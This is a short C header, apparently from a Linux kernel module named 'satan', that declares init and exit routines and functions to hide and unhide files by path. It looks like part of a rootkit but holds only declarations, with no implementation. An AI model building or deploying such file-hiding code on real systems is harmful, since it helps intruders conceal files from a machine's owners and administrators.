// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#ifndef SATAN_FILE_H_
#define SATAN_FILE_H_

#include <linux/string.h>

int satan_file_init(void);
void satan_file_exit(void);

int satan_file_hide(const char *path);
int satan_file_unhide(const char *path);

#endif  // SATAN_FILE_H_
